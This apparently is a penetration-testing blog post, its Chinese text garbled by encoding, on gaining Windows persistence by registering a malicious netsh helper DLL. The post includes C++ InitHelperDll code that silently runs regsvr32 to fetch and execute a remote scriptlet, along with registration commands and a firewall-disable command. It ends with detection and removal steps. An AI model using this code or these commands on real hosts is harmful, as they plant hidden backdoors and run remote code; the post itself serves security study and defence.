I"Õ"<p><strong>About:</strong></p>

<ul>
  <li>Common commands of netsh</li>
  <li>Matthew Demaskeâ€™s way of using netshell to execute evil dlls and persist on a host</li>
  <li>Write a dll with the InitHelperDll function</li>
  <li>How to use</li>
  <li>Detection</li>
</ul>

<p><strong>ç›®å½•ï¼š</strong></p>

<ul>
  <li>ä»‹ç»netshçš„å¸¸ç”¨å‘½ä»¤</li>
  <li>æµ‹è¯•Matthew Demaskeåˆ†äº«çš„æ–¹æ³•â€”â€”using netshell to execute evil dlls and persist on a host</li>
  <li>å¦‚ä½•ä½¿ç”¨c++ç¼–å†™å¯¼å‡ºå‡½æ•°ä¸ºInitHelperDllçš„helper dll</li>
  <li>å®é™…æµ‹è¯•åˆ©ç”¨</li>
  <li>é˜²å¾¡å’Œæ£€æµ‹</li>
</ul>

<p><strong>Reference:</strong></p>

<p>http://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/</p>

<h2 id="0x00-ç®€ä»‹">0x00 ç®€ä»‹</h2>
<hr />
<p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œä½¿ç”¨ç³»ç»Ÿä¸­é»˜è®¤æ”¯æŒçš„å‘½ä»¤å¸¸å¸¸å¯ä»¥ç»•è¿‡å„ç§æ£€æµ‹å’Œæ‹¦æˆªï¼Œæ¯”å¦‚æˆ‘åœ¨ã€ŠUse bitsadmin to maintain persistence and bypass Autorunsã€‹ä¸­ä»‹ç»è¿‡å¦‚ä½•åˆ©ç”¨ç³»ç»Ÿé»˜è®¤æ”¯æŒçš„bitsadminæ¥å®ç°è‡ªå¯åŠ¨ï¼Œå¹¶ç»•è¿‡Autorunsçš„æ£€æµ‹ã€‚</p>

<p>Matthew Demaskeåœ¨æœ€è¿‘åˆ†äº«äº†ä¸€ä¸ªä»–å‘ç°çš„æ–¹æ³•ï¼ŒåŒæ ·æ˜¯åˆ©ç”¨ç³»ç»Ÿä¸­é»˜è®¤æ”¯æŒçš„å‘½ä»¤â€”â€”using netshell to execute evil dlls and persist on a hostï¼Œæœ¬æ–‡å°†å¯¹å…¶æ–¹æ³•è¿›è¡Œæ•´ç†ï¼Œå¹¶è¡¥å…¨æ–‡ä¸­æœªå…·ä½“ä»‹ç»çš„dllç¼–å†™æ–¹æ³•</p>

<h2 id="0x01-netshç®€ä»‹">0x01 netshç®€ä»‹</h2>
<hr />
<p>æ˜¯windowsç³»ç»Ÿæœ¬èº«æä¾›çš„åŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œé…ç½®å‘½ä»¤è¡Œå·¥å…·ï¼Œå¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<p>æŸ¥çœ‹ipé…ç½®ä¿¡æ¯ï¼š
<code class="language-plaintext highlighter-rouge">netsh interface ip show config</code></p>

<p>æŸ¥çœ‹ç½‘ç»œé…ç½®æ–‡ä»¶ï¼š
<code class="language-plaintext highlighter-rouge">netsh -c interface dump</code></p>

<p>å¼€/å…³ç½‘å¡ï¼š
<code class="language-plaintext highlighter-rouge">netsh int set int name="ethernet" admin=enabled</code>
<code class="language-plaintext highlighter-rouge">netsh int set int name="ethernet" admin=disabled</code></p>

<p>æŸ¥çœ‹æ‰€æœ‰tcpè¿æ¥ï¼š
<code class="language-plaintext highlighter-rouge">netsh interface ip show tcpconnections</code></p>

<p>è®¾ç½®æœ¬æœºipã€å­ç½‘æ©ç ã€ç½‘å…³ipï¼š
<code class="language-plaintext highlighter-rouge">netsh interface ip set address "Local Area Connection" static 192.168.1.2 255.255.255.0 192.168.1.1</code></p>

<p>æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€ï¼š
<code class="language-plaintext highlighter-rouge">netsh firewall show state</code></p>

<p>å¼€/å…³é˜²ç«å¢™ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">netsh firewall set opmode enable</code></p>

<p><code class="language-plaintext highlighter-rouge">netsh firewall set opmode disable</code></p>

<p>è¾“å…¥netsh /?å¯æŸ¥çœ‹æ›´è¯¦ç»†çš„å‘½ä»¤å¸®åŠ©ï¼Œå…¶ä¸­addå‘½ä»¤å€¼å¾—æ³¨æ„ï¼Œè¾“å…¥netsh add /?è·å¾—æ›´è¯¦ç»†å†…å®¹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh add /?
The following commands are available:
Commands in this context:
add helper - Installs a helper DLL.
</code></pre></div></div>

<p>å¦‚æœåœ¨æ­¤æ·»åŠ ä¸€ä¸ªæµ‹è¯•dllï¼Œç»“æœä¼šæ€æ ·å‘¢ï¼Ÿ</p>

<h2 id="0x02-ç¼–å†™helper-dll">0x02 ç¼–å†™helper DLL</h2>
<hr />
<p>æ¯ä¸ªhelper DLLéƒ½éœ€è¦åŒ…å«å¯¼å‡ºå‡½æ•°InitHelperDll</p>

<p>åœ¨æ·»åŠ helper DLLåï¼Œæ¯æ¬¡netshåœ¨åˆå§‹åŠ è½½çš„æ—¶å€™ä¼šè°ƒç”¨è¯¥helper DLLä¸­çš„å¯¼å‡ºå‡½æ•°InitHelperDll</p>

<p>InitHelperDllç¤ºä¾‹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DWORD
WINAPI
InitHelperDll(
    DWORD      dwNetshVersion,
    PVOID      pReserved
)
{
    NS_HELPER_ATTRIBUTES attMyAttributes;

    attMyAttributes.guidHelper = g_MyGuid;
    attMyAttributes.dwVersion  = 1;
    attMyAttributes.pfnStart   = NetshStartHelper;
    RegisterHelper( NULL, &amp;attMyAttributes );
    return NO_ERROR;
}
</code></pre></div></div>

<p>å…³äºInitHelperDllçš„ç»†èŠ‚å¯å‚ç…§å¦‚ä¸‹é“¾æ¥ï¼š</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/ms708327(v=vs.85).aspx</p>

<p>åœ¨ã€ŠCode Execution of Regsvr32.exeã€‹æ›¾å…·ä½“ä»‹ç»è¿‡å¦‚ä½•ä¸ºdllæ·»åŠ ä¸€ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæ¥ç€ç®€å•ä»‹ç»ä¸€ä¸‹ï¼š</p>

<p>æ–°å»ºc++å·¥ç¨‹ï¼Œåˆ›å»ºä¸€ä¸ªdllé¡¹ç›® åœ¨ä¸»æ–‡ä»¶æ·»åŠ :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DWORD WINAPI InitHelperDll(DWORD dwNetshVersion,PVOID pReserved)
{
	char *command="cmd.exe /c start regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll";
    WinExec(command,SW_HIDE); 
	return 0;
}
</code></pre></div></div>

<p>æ·»åŠ å¯¼å‡ºå‡½æ•°å£°æ˜:</p>

<p>æ–‡ä»¶ç±»å‹ï¼š</p>

<p>Text File</p>

<p>åç§°ï¼š</p>

<p>åŒåæ–‡ä»¶.def</p>

<p>å†™å…¥</p>

<p>EXPORTS
InitHelperDll</p>

<p>ç¼–è¯‘å³å¯</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>Marc Smeetsåˆ†äº«äº†ä»–çš„POCä»£ç ï¼Œå®šä¹‰å¯¼å‡ºå‡½æ•°ä½¿ç”¨çš„æ˜¯å¦ä¸€ç§æ–¹å¼:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)
</code></pre></div></div>

<p>payloadä¸ºåˆ›å»ºæ–°çº¿ç¨‹æ‰§è¡Œshellcode</p>

<p><strong>é¡¹ç›®åœ°å€å¦‚ä¸‹ï¼š</strong></p>

<p>https://github.com/outflankbv/NetshHelperBeacon</p>

<h2 id="0x03-æ·»åŠ è‡ªå®šä¹‰helper-dll">0x03 æ·»åŠ è‡ªå®šä¹‰helper dll</h2>
<hr />
<p><strong>æ³¨ï¼š</strong></p>

<p>éœ€è¦ç®¡ç†å‘˜æƒé™</p>

<p>é€šè¿‡cmdæ·»åŠ :</p>

<p><code class="language-plaintext highlighter-rouge">netsh add helper c:\test\netshtest.dll</code></p>

<p>å¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/2-1.png" alt="Alt text" /></p>

<p>å¦‚ä¸‹å›¾ï¼Œæ³¨å†Œè¡¨åŒæ­¥åˆ›å»ºé”®å€¼</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/2-2.png" alt="Alt text" /></p>

<p>ä½ç½®ï¼š<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></p>

<p>åç§°ï¼š<code class="language-plaintext highlighter-rouge">netshtest</code></p>

<p>ç±»å‹ï¼š<code class="language-plaintext highlighter-rouge">REG_SZ</code></p>

<p>æ•°æ®ï¼š<code class="language-plaintext highlighter-rouge">c:\test\netshtest.dll</code></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>é€šè¿‡æ³¨å†Œè¡¨ç›´æ¥æ·»åŠ é”®å€¼åŒnetsh add æ·»åŠ helper dllçš„ä½œç”¨ä¸€æ ·</p>

<h2 id="0x04-è§¦å‘åé—¨">0x04 è§¦å‘åé—¨</h2>
<hr />
<p>helper dllæ·»åŠ æˆåŠŸåï¼Œæ¯æ¬¡è°ƒç”¨netshï¼Œå‡ä¼šåŠ è½½c:\test\netshtest.dll</p>

<p>å¦‚å›¾ï¼Œè¿è¡Œnetshå‘½ä»¤ï¼ŒåŠ è½½c:\test\netshtest.dllï¼Œå¼¹å‡ºè®¡ç®—å™¨</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/2-3.png" alt="Alt text" /></p>

<p>éªŒè¯ï¼š</p>

<ul>
  <li>ä½¿ç”¨Process ExploreræŸ¥çœ‹netshè¿›ç¨‹åŠ è½½çš„dll</li>
</ul>

<p>å¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/3-1.png" alt="Alt text" /></p>

<ul>
  <li>ä½¿ç”¨Process Monitoråœ¨è¿›ç¨‹å±æ€§Event Propertiesä¹Ÿå¯ä»¥æŸ¥çœ‹</li>
</ul>

<p>å¦‚å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/3-2.png" alt="Alt text" /></p>

<h2 id="0x05-persistence">0x05 Persistence</h2>
<hr />

<ul>
  <li>
    <p>netshä½œä¸ºç³»ç»Ÿå¸¸ç”¨å‘½ä»¤ï¼Œå­˜åœ¨è¢«ç”¨æˆ·æ­£å¸¸ä½¿ç”¨çš„æ¦‚ç‡ï¼Œæ‰€ä»¥åªè¦å¯åŠ¨netshå³å¯è§¦å‘payload</p>
  </li>
  <li>
    <p>å¦‚æœè¢«æ·»åŠ ä¸ºå¸¸ç”¨çš„å¼€æœºå¯åŠ¨é¡¹ï¼Œä¹Ÿå¾ˆæœ‰è¿·æƒ‘æ€§ï¼Œå› ä¸ºæ˜¾ç¤ºçš„ä»…ä»…æ˜¯å¯åŠ¨netsh.exe</p>
  </li>
</ul>

<h2 id="0x06-æ£€æµ‹">0x06 æ£€æµ‹</h2>
<hr />

<p>ç›‘æ§æ³¨å†Œè¡¨ä½ç½®<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></p>

<p><strong>æ³¨ï¼š</strong></p>

<ul>
  <li>
    <p>netsh show helperå‘½ä»¤å¹¶ä¸èƒ½æŸ¥åˆ°æ–°æ·»åŠ çš„helper dll</p>
  </li>
  <li>
    <p>éœ€è¦ç•™æ„æ³¨å†Œè¡¨å†…æ­£å¸¸çš„dllæ˜¯å¦è¢«æ›¿æ¢</p>
  </li>
</ul>

<h2 id="0x07-æ¸…é™¤">0x07 æ¸…é™¤</h2>
<hr />

<p>é€šè¿‡cmd:</p>

<p><code class="language-plaintext highlighter-rouge">netsh delete helper c:\test\netshtest.dll</code></p>

<p>é€šè¿‡æ³¨å†Œè¡¨:</p>

<p><code class="language-plaintext highlighter-rouge">åœ¨HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetShåˆ é™¤å¯¹åº”é”®å€¼</code></p>

<h2 id="0x08-å°ç»“">0x08 å°ç»“</h2>
<hr />

<ul>
  <li>
    <p>Netsh Persistenceå®ç°çš„å‰ææ˜¯å·²ç»è·å¾—äº†ç®¡ç†å‘˜æƒé™</p>
  </li>
  <li>
    <p>éƒ¨åˆ†vpnè½¯ä»¶åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨netshå‘½ä»¤ï¼Œè¿™æ ·å°±è§£å†³äº†Netsh Persistenceçš„è‡ªå¯åŠ¨é—®é¢˜ï¼Œè¯¥æ–¹æ³•å€¼å¾—æµ‹è¯•</p>
  </li>
  <li>
    <p>å¦‚æœåœ¨å¼€æœºå¯åŠ¨é¡¹ä¸­å‘ç°æœ‰netshï¼Œå€¼å¾—ç•™æ„ï¼Œéœ€è¦æŸ¥çœ‹å¯¹åº”æ³¨å†Œè¡¨é”®å€¼ä¸­æ˜¯å¦åŒ…å«æ¶æ„çš„helper dll</p>
  </li>
  <li>
    <p>ä¸åŒç³»ç»Ÿä¸­æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetShä¸‹çš„é»˜è®¤é”®å€¼å­˜åœ¨å·®å¼‚ï¼Œéœ€è¦å¯¹æ¯”æŸ¥æ‰¾é»˜è®¤é”®å€¼æ˜¯å¦è¢«ç¯¡æ”¹</p>
  </li>
</ul>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
:ET